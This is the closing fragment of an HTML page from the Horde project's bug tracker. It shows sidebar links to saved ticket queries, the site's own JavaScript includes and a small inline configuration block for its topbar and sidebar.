<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/263">Enhancements waiting for Feedback</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/277">Bugs with Patches</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/278">Enhancements with Patches</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/showstoppers">Release Showstoppers</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/stalled">Stalled Tickets</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/new">New Tickets</a> </div>
</div>
<div class="horde-subnavi">
 <div class="horde-subnavi-icon whups-sidebar-query">
  <a class="icon"></a>
 </div><div class="horde-subnavi-point"><a href="https://bugs.horde.org/query/showstoppers5">Horde 5 Showstoppers</a> </div>
</div>
</div>

</div>

<div id="horde-slideleft" class="horde-splitbar-vert" style="left:210px">
  <div id="horde-slideleftcursor" class="horde-splitbar-vert-handle"></div>
</div>
</div>
  <script type="text/javascript" src="https://bugs.horde.org/h/js/prototype.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/horde.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/popup.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/date/en-US.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/date/date.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/topbar.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/accesskeys.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/form_ghost.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/scriptaculous/effects.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/toggle_quotes.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script><script type="text/javascript" src="https://bugs.horde.org/h/js/sidebar.js?v=830f6bf3f2f6286088a4dc87175cd80e"></script>  <script type="text/javascript">//<![CDATA[
HordeTopbar.conf={"URI_AJAX":"\/h\/services\/ajax.php\/horde\/","app":"whups","format":"yyyy-MM-dd","hash":"9a1e674d0eaf6cf6f9ec5837072e86c7","refresh":300};HordeSidebar.text={"collapse":"Collapse","expand":"Expand"};HordeSidebar.opts={"cookieDomain":".horde.org","cookiePath":"\/"};HordePopup.popup_block_text="A popup window could not be opened. Your browser may be blocking popups.";
//]]></script>
   </body>
</html>
